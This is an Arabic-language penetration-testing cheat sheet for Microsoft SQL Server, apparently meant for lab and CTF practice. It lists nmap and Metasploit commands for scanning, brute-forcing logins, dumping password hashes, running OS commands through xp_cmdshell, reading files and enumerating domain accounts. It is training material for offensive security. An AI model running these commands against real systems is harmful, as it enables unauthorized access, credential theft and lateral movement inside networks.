MSSQL — من الفحص إلى ما بعد الاستغلال

ملاحظة عن البورت: المنفذ الشائع لـMicrosoft SQL Server هو 1433/TCP، لكن الـinstance قد يعمل على منفذ مختلف. إذا لم يظهر على 1433، لا تستبعد MSSQL قبل فحص جميع البورتات وتحديد الخدمة بالإصدار.

1. Reconnaissance

تأكد من الشبكة والهدف أولًا، ثم ابحث عن MSSQL ضمن الخدمات المكشوفة.

معرفة عنوانك والواجهة KALI TERMINAL GENERAL
ip a ifconfig
في بيئة VPN راقب واجهة مثل tun0 لمعرفة عنوان المهاجم الصحيح.
اختبار الوصول للهدف KALI TERMINAL GENERAL
ping -c 4 [TARGET]
إذا لم يرد الهدف على ICMP لا تعتبره Down؛ أكمل بـNmap واستخدم -Pn عند الحاجة.
اكتشاف الأجهزة عند الحاجة KALI TERMINAL GENERAL
nmap -sn [SUBNET]

2. Port Scanning

ابدأ بالمنفذ الشائع ثم انتقل للفحص الشامل إذا لم يظهر SQL Server.

فحص MSSQL مع Service Detection KALI TERMINAL
nmap -p1433 -sV [TARGET]
✓ ابحث عن: 1433/tcp open ms-sql-s
فحص مركز مع Default Scripts KALI TERMINAL GENERAL
nmap -p1433 -sV -sC [TARGET]
يساعد في التقاط معلومات إضافية قبل الانتقال إلى MSSQL NSE scripts المتخصصة.
إذا لم يظهر 1433 — افحص جميع TCP ports KALI TERMINAL GENERAL
nmap -p- --min-rate=1000 -T4 [TARGET]
إذا اكتشفت MSSQL على منفذ مختلف، استبدل 1433 بالمنفذ الفعلي في الفحوص اللاحقة.

3. Enumeration

اجمع معلومات الـinstance والمصادقة، ثم أعد Enumeration بعد الحصول على Credentials.

Instance / NTLM Information

معلومات SQL Server عبر Nmap KALI TERMINAL
nmap -p1433 --script ms-sql-info [TARGET]
استخدم الناتج لتحديد الـinstance والإصدار والمعلومات المتاحة قبل تسجيل الدخول.
استخراج NTLM information KALI TERMINAL
nmap -p1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 [TARGET]
قد يكشف معلومات مفيدة عن Windows host/domain تساعدك في ربط MSSQL بباقي خدمات الهدف.

Enumeration بعد Credentials

Enumeration عام عبر Metasploit MSFCONSOLE
use auxiliary/admin/mssql/mssql_enum set RHOSTS [TARGET] set USERNAME [USERNAME] set PASSWORD [PASSWORD] run
Enumeration لحسابات SQL Logins MSFCONSOLE
use auxiliary/admin/mssql/mssql_enum_sql_logins set RHOSTS [TARGET] set USERNAME [USERNAME] set PASSWORD [PASSWORD] run
استخدم الحسابات المكتشفة فقط ضمن مسار اللاب، ثم اختبر Credential reuse إذا كان ذلك منطقيًا.
عرض SQL logins عبر Nmap query KALI TERMINAL
nmap -p1433 --script ms-sql-query --script-args mssql.username=[USERNAME],mssql.password=[PASSWORD],ms-sql-query.query="SELECT * FROM master..syslogins" [TARGET]
Domain Accounts Enumeration MSFCONSOLE
use auxiliary/admin/mssql/mssql_enum_domain_accounts set RHOSTS [TARGET] set USERNAME [USERNAME] set PASSWORD [PASSWORD] run
قد يعرض Windows domain users/groups/computer accounts عندما تسمح بيئة SQL Server بذلك.

4. Credential Testing

اختبر Empty Password والـwordlists ثم أكد أي Credentials ناجحة قبل الاستغلال.

فحص Empty Password عبر Nmap KALI TERMINAL
nmap -p1433 --script ms-sql-empty-password [TARGET]
Brute Force عبر Nmap NSE KALI TERMINAL
nmap -p1433 --script ms-sql-brute --script-args userdb=[USERLIST],passdb=[WORDLIST] [TARGET]
✓ عند النجاح يعرض الـscript الحساب/كلمة المرور التي تم قبولها.
Credential Testing عبر Metasploit MSFCONSOLE
use auxiliary/scanner/mssql/mssql_login set RHOSTS [TARGET] set USER_FILE [USERLIST] set PASS_FILE [WORDLIST] run
بعد نجاح حساب، لا تكمل brute force بلا داعٍ؛ انتقل مباشرة إلى Enumeration الموثق بالحساب.
تأكيد Login يدويًا KALI TERMINAL GENERAL
impacket-mssqlclient [USERNAME]:[PASSWORD]@[TARGET]
إذا كانت الأداة مثبتة باسم قديم في بيئتك قد تجدها كـmssqlclient.py.
Brute-force عبر Nmap NSE KALI TERMINAL
nmap -p1433 --script=ms-sql-brute --script-args userdb=[USERLIST],passdb=[WORDLIST] [TARGET]
Brute-force عبر Metasploit MSFCONSOLE
use auxiliary/scanner/mssql/mssql_login set RHOSTS [TARGET] run

5. Exploitation

المسار الأساسي هنا هو استخدام صلاحيات SQL الموثقة ثم xp_cmdshell إذا كان متاحًا.

تحذير: لا تفترض أن Credentials صحيحة تعني OS command execution. تحقق أولًا من صلاحيات الحساب وحالة xp_cmdshell.

Database / Hash Access WINDOWS

Dump SQL login hashes عبر Nmap KALI TERMINAL
nmap -p1433 --script ms-sql-dump-hashes --script-args mssql.username=[USERNAME],mssql.password=[PASSWORD] [TARGET]
يحتاج حسابًا يملك الصلاحية المناسبة؛ احتفظ بالـhashes لمسار Credential Access/Reuse عند الحاجة.

OS Command Execution — xp_cmdshell WINDOWS

اختبار تنفيذ أمر بسيط عبر Nmap KALI TERMINAL
nmap -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=[USERNAME],mssql.password=[PASSWORD],ms-sql-xp-cmdshell.cmd="ipconfig" [TARGET]
✓ النجاح = ظهور ناتج ipconfig الخاص بنظام Windows الهدف.
قراءة ملف بعد تأكيد xp_cmdshell KALI TERMINAL
nmap -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=[USERNAME],mssql.password=[PASSWORD],ms-sql-xp-cmdshell.cmd="type c:\\[FILE]" [TARGET]
تنفيذ Command عبر Metasploit MSFCONSOLE
use auxiliary/admin/mssql/mssql_exec set RHOSTS [TARGET] set USERNAME [USERNAME] set PASSWORD [PASSWORD] set CMD whoami run
هذا المسار يعتمد على توفر xp_cmdshell والصلاحيات اللازمة.
تنفيذ أمر من جلسة MSSQL اليدوية MSSQL CLIENT GENERAL
SQL> xp_cmdshell whoami SQL> xp_cmdshell ipconfig
إذا نجح whoami فقد انتقلت من Database access إلى OS command execution؛ سجل هوية حساب خدمة SQL Server لأنها تحدد صلاحياتك الفعلية على Windows.
تنفيذ استعلام مباشر (مثال: قراءة جدول تسجيل الدخول) KALI TERMINAL
nmap -p1433 --script=ms-sql-query --script-args mssql.username=[USER],mssql.password=[PASS],ms-sql-query.query="SELECT * FROM master..syslogins" [TARGET]
استخراج هاشات المستخدمين KALI TERMINAL
nmap -p1433 --script=ms-sql-dump-hashes --script-args mssql.username=[USER],mssql.password=[PASS] [TARGET]
تفعيل وتنفيذ أوامر نظام KALI TERMINAL
nmap -p1433 --script=ms-sql-xp-cmdshell --script-args mssql.username=[USER],mssql.password=[PASS],ms-sql-xp-cmdshell.cmd="whoami" [TARGET]
✓ النتيجة المتوقعة: يرجع خرج الأمر مباشرة بصفحة Nmap (مثال: nt authority\\system لو الخدمة تشتغل بصلاحية مرتفعة)
استبدل الأمر بـ type c:\\flag.txt أو أي أمر تاني حسب هدفك باللاب
تنويه: xp_cmdshell يحتاج صلاحية sysadmin على الحساب المستخدم — لو الأمر ما نفذ رغم صحة بيانات الدخول، الحساب غالبًا صلاحياته محدودة.
عبر Metasploit — بديل أسهل للتكرار MSFCONSOLE
use auxiliary/admin/mssql/mssql_exec set RHOSTS [TARGET] set USERNAME [USER] set PASSWORD [PASS] set CMD whoami run
تعداد حسابات الدومين عبر MSSQL MSFCONSOLE
use auxiliary/admin/mssql/mssql_enum_domain_accounts set RHOSTS [TARGET] set USERNAME [USER] set PASSWORD [PASS] run
يكشف يوزرات وجروبات وأجهزة الدومين كاملة — مفيد جدًا لمرحلة Lateral Movement لاحقًا

6. Post-Exploitation

بعد إثبات SQL أو OS access — تحقق من السياق فورًا ثم انتقل للمراجع العامة بدل تكرارها هنا.

تأكيد حساب SQL الحالي MSSQL CLIENT GENERAL
SQL> SELECT SYSTEM_USER; SQL> SELECT USER_NAME();
يفرق بين هوية SQL وهوية Windows التي تعمل بها خدمة SQL Server.
تأكيد هوية Windows عبر xp_cmdshell MSSQL CLIENT
SQL> xp_cmdshell whoami SQL> xp_cmdshell hostname SQL> xp_cmdshell ipconfig
✓ النجاح = أوامر Windows ترجع Output من الهدف داخل جلسة SQL.
Credential Reuse بعد اكتشاف حساب صالح KALI TERMINAL
# أعد اختبار الـCredentials المكتشفة فقط على الخدمات الأخرى التي ظهرت أثناء الفحص nmap -sV [TARGET]
إذا ظهر SMB/RDP/WinRM مع MSSQL، راجع Cheatsheet الخدمة نفسها لاختبار نفس الحساب بالطريقة الصحيحة بدل خلط الـworkflows هنا.
إذا حصلت على Shell كامل VICTIM SHELL GENERAL
whoami hostname ipconfig
بعدها انتقل إلى Windows Post-Exploitation / Privilege Escalation؛ لا نكرر المراحل العامة داخل ملف MSSQL.
